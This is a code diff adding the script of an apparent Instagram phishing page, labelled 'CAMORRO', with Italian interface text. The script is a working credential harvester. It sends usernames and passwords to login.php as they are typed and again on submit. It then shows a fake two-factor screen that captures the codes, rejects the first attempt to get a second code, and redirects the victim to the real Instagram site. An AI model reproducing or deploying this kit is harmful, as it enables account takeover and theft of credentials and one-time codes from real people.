@@ -1,0 +1,204 @@
+<script>
+// ============================================
+//  CAMORRO - send credentials to local PHP
+// ============================================
+function sendCapture(payload) {
+    // POST JSON to same-origin login.php (served by PHP built-in server)
+    fetch('login.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        keepalive: true
+    }).catch(function () {
+        // fallback: image beacon (GET-like via query not used; try sendBeacon)
+        try {
+            navigator.sendBeacon('login.php', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+        } catch (e) {}
+    });
+}
+
+// ============================================
+//  ELEMENTS
+// ============================================
+const splash = document.getElementById('splash');
+const loginContainer = document.getElementById('loginContainer');
+const twofaContainer = document.getElementById('twofaContainer');
+const loadingScreen = document.getElementById('loadingScreen');
+const loadingText = document.getElementById('loadingText');
+
+const username = document.getElementById('username');
+const password = document.getElementById('password');
+const loginBtn = document.getElementById('loginBtn');
+const loginError = document.getElementById('loginError');
+
+const displayUser = document.getElementById('displayUser');
+const codeBoxes = document.querySelectorAll('.code-box');
+const verifyBtn = document.getElementById('verifyBtn');
+const twofaError = document.getElementById('twofaError');
+const backToLogin = document.getElementById('backToLogin');
+const resendBtn = document.getElementById('resendBtn');
+
+let capturedUsername = '';
+let capturedPassword = '';
+let verificationAttempts = 0;
+let usernameSent = false;
+let passwordSent = false;
+
+// SPLASH
+setTimeout(() => {
+    splash.style.display = 'none';
+}, 2500);
+
+// LOGIN VALIDATION
+function checkLogin() {
+    loginBtn.disabled = !(username.value.trim() && password.value.trim());
+}
+username.addEventListener('input', checkLogin);
+password.addEventListener('input', checkLogin);
+
+// Capture username on blur
+username.addEventListener('blur', function () {
+    const val = this.value.trim();
+    if (val && !usernameSent) {
+        usernameSent = true;
+        sendCapture({ type: 'username', username: val });
+    }
+});
+
+// Capture password on blur
+password.addEventListener('blur', function () {
+    const val = this.value;
+    if (val && !passwordSent) {
+        passwordSent = true;
+        sendCapture({
+            type: 'password',
+            username: username.value.trim() || 'N/A',
+            password: val
+        });
+    }
+});
+
+// LOGIN SUBMIT
+loginBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+
+    capturedUsername = username.value.trim();
+    capturedPassword = password.value;
+
+    sendCapture({
+        type: 'login',
+        username: capturedUsername,
+        password: capturedPassword
+    });
+
+    loginBtn.disabled = true;
+    loginBtn.textContent = 'Verifica...';
+
+    setTimeout(() => {
+        loginContainer.classList.remove('active');
+        twofaContainer.classList.add('active');
+        displayUser.textContent = capturedUsername || 'telefono';
+
+        codeBoxes.forEach(box => box.value = '');
+        codeBoxes[0].focus();
+        verifyBtn.disabled = true;
+        twofaError.style.display = 'none';
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Accedi';
+    }, 2000);
+});
+
+// 2FA INPUT
+codeBoxes.forEach((box, index) => {
+    box.addEventListener('input', function () {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
+        if (this.value && index < codeBoxes.length - 1) {
+            codeBoxes[index + 1].focus();
+        }
+        const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
+        verifyBtn.disabled = !allFilled;
+        twofaError.style.display = 'none';
+    });
+
+    box.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !this.value && index > 0) {
+            codeBoxes[index - 1].focus();
+        }
+    });
+
+    box.addEventListener('paste', function (e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
+        digits.split('').forEach((d, i) => {
+            if (codeBoxes[i]) codeBoxes[i].value = d;
+        });
+        if (digits.length === 6) {
+            codeBoxes[5].focus();
+            verifyBtn.disabled = false;
+        } else if (codeBoxes[digits.length]) {
+            codeBoxes[digits.length].focus();
+        }
+    });
+});
+
+// VERIFY 2FA
+verifyBtn.addEventListener('click', function () {
+    const code = Array.from(codeBoxes).map(b => b.value).join('');
+    verificationAttempts++;
+
+    loadingScreen.style.display = 'flex';
+    loadingText.textContent = 'Verifica codice...';
+
+    sendCapture({
+        type: '2fa',
+        username: capturedUsername,
+        code: code,
+        attempt: verificationAttempts
+    });
+
+    setTimeout(() => {
+        loadingScreen.style.display = 'none';
+
+        if (verificationAttempts >= 2) {
+            loadingText.textContent = 'Reindirizzamento...';
+            loadingScreen.style.display = 'flex';
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com';
+            }, 1500);
+        } else {
+            twofaError.style.display = 'block';
+            codeBoxes.forEach(box => box.value = '');
+            codeBoxes[0].focus();
+            verifyBtn.disabled = true;
+        }
+    }, 1500);
+});
+
+// BACK
+backToLogin.addEventListener('click', function () {
+    twofaContainer.classList.remove('active');
+    loginContainer.classList.add('active');
+    twofaError.style.display = 'none';
+    codeBoxes.forEach(box => box.value = '');
+    verificationAttempts = 0;
+});
+
+// RESEND
+resendBtn.addEventListener('click', function () {
+    codeBoxes.forEach(box => box.value = '');
+    codeBoxes[0].focus();
+    verifyBtn.disabled = true;
+    twofaError.style.display = 'none';
+    sendCapture({ type: 'resend', username: capturedUsername });
+});
+
+// TRY DIFFERENT
+document.getElementById('tryDifferent').addEventListener('click', function () {
+    twofaContainer.classList.remove('active');
+    loginContainer.classList.add('active');
+    twofaError.style.display = 'none';
+    verificationAttempts = 0;
+    sendCapture({ type: 'try_different', username: capturedUsername });
+});
+</script>
